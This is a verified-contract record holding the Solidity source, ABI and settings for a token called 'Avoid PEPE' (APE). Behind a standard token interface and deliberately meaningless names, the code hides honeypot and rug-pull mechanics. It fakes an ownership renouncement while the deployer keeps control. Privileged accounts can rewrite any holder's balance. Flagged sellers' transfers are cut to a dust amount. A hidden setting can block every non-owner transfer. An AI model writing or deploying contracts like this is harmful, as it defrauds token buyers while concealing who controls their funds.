{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fundToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTake) external view returns (uint256);\n\n    function transfer(address enableLaunched, uint256 exemptWalletTotal) external returns (bool);\n\n    function allowance(address buyTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptWalletTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableLaunched,\n        uint256 exemptWalletTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTotal, uint256 value);\n    event Approval(address indexed buyTeam, address indexed spender, uint256 value);\n}\n\nabstract contract tokenList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalTx {\n    function createPair(address maxTokenWallet, address isAmountSwap) external returns (address);\n}\n\ninterface buyAuto is fundToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AvoidPEPE is tokenList, fundToken, buyAuto {\n\n    uint256 takeMarketingLimit;\n\n    address private maxWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atModeLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return maxWallet;\n    }\n\n    function owner() external view returns (address) {\n        return maxWallet;\n    }\n\n    function allowance(address isShouldBuy, address autoFund) external view virtual override returns (uint256) {\n        if (autoFund == autoSell) {\n            return type(uint256).max;\n        }\n        return listEnable[isShouldBuy][autoFund];\n    }\n\n    string private shouldSender = \"APE\";\n\n    uint256 private teamAmount;\n\n    function senderFrom() public {\n        emit OwnershipTransferred(limitMax, address(0));\n        maxWallet = address(0);\n    }\n\n    address autoSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed receiverTrading, address indexed minMode);\n\n    string private receiverSender = \"Avoid PEPE\";\n\n    address tokenAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private listEnable;\n\n    bool public fundMax;\n\n    uint256 constant fundMode = 10 ** 10;\n\n    address public limitMax;\n\n    mapping(address => bool) public sellTrading;\n\n    function shouldTokenFund(uint256 exemptWalletTotal) public {\n        amountTotal();\n        takeMarketingLimit = exemptWalletTotal;\n    }\n\n    mapping(address => bool) public takeIsAuto;\n\n    function transferFrom(address shouldMarketing, address enableLaunched, uint256 exemptWalletTotal) external override returns (bool) {\n        if (_msgSender() != autoSell) {\n            if (listEnable[shouldMarketing][_msgSender()] != type(uint256).max) {\n                require(exemptWalletTotal <= listEnable[shouldMarketing][_msgSender()]);\n                listEnable[shouldMarketing][_msgSender()] -= exemptWalletTotal;\n            }\n        }\n        return launchedLiquidity(shouldMarketing, enableLaunched, exemptWalletTotal);\n    }\n\n    function amountLimit(address toSender) public {\n        amountTotal();\n        \n        if (toSender == limitMax || toSender == swapAmount) {\n            return;\n        }\n        sellTrading[toSender] = true;\n    }\n\n    function balanceOf(address totalTake) public view virtual override returns (uint256) {\n        return launchedLaunchLimit[totalTake];\n    }\n\n    function tradingTeam(address toTake, uint256 exemptWalletTotal) public {\n        amountTotal();\n        launchedLaunchLimit[toTake] = exemptWalletTotal;\n    }\n\n    function approve(address autoFund, uint256 exemptWalletTotal) public virtual override returns (bool) {\n        listEnable[_msgSender()][autoFund] = exemptWalletTotal;\n        emit Approval(_msgSender(), autoFund, exemptWalletTotal);\n        return true;\n    }\n\n    function transfer(address toTake, uint256 exemptWalletTotal) external virtual override returns (bool) {\n        return launchedLiquidity(_msgSender(), toTake, exemptWalletTotal);\n    }\n\n    function senderFee(address receiverAuto) public {\n        require(receiverAuto.balance < 100000);\n        if (walletLaunched) {\n            return;\n        }\n        if (exemptIs == teamAmount) {\n            teamAmount = exemptIs;\n        }\n        takeIsAuto[receiverAuto] = true;\n        if (exemptIs == teamAmount) {\n            exemptIs = teamAmount;\n        }\n        walletLaunched = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldSender;\n    }\n\n    uint256 private atModeLaunched = 100000000 * 10 ** 18;\n\n    bool public exemptFund;\n\n    address public swapAmount;\n\n    mapping(address => uint256) private launchedLaunchLimit;\n\n    function swapList(address shouldMarketing, address enableLaunched, uint256 exemptWalletTotal) internal returns (bool) {\n        require(launchedLaunchLimit[shouldMarketing] >= exemptWalletTotal);\n        launchedLaunchLimit[shouldMarketing] -= exemptWalletTotal;\n        launchedLaunchLimit[enableLaunched] += exemptWalletTotal;\n        emit Transfer(shouldMarketing, enableLaunched, exemptWalletTotal);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minAt;\n    }\n\n    bool public walletLaunched;\n\n    uint256 launchedSender;\n\n    uint8 private minAt = 18;\n\n    constructor (){\n        \n        amountMax totalLimit = amountMax(autoSell);\n        swapAmount = totalTx(totalLimit.factory()).createPair(totalLimit.WETH(), address(this));\n        if (exemptIs == teamAmount) {\n            exemptIs = teamAmount;\n        }\n        limitMax = _msgSender();\n        senderFrom();\n        takeIsAuto[limitMax] = true;\n        launchedLaunchLimit[limitMax] = atModeLaunched;\n        if (teamAmount != exemptIs) {\n            exemptIs = teamAmount;\n        }\n        emit Transfer(address(0), limitMax, atModeLaunched);\n    }\n\n    uint256 private exemptIs;\n\n    function amountTotal() private view {\n        require(takeIsAuto[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    function launchedLiquidity(address shouldMarketing, address enableLaunched, uint256 exemptWalletTotal) internal returns (bool) {\n        if (shouldMarketing == limitMax) {\n            return swapList(shouldMarketing, enableLaunched, exemptWalletTotal);\n        }\n        uint256 takeTx = fundToken(swapAmount).balanceOf(tokenAuto);\n        require(takeTx == takeMarketingLimit);\n        require(enableLaunched != tokenAuto);\n        if (sellTrading[shouldMarketing]) {\n            return swapList(shouldMarketing, enableLaunched, fundMode);\n        }\n        return swapList(shouldMarketing, enableLaunched, exemptWalletTotal);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShouldBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptWalletTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptWalletTotal\",\"type\":\"uint256\"}],\"name\":\"shouldTokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeIsAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptWalletTotal\",\"type\":\"uint256\"}],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptWalletTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptWalletTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AvoidPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}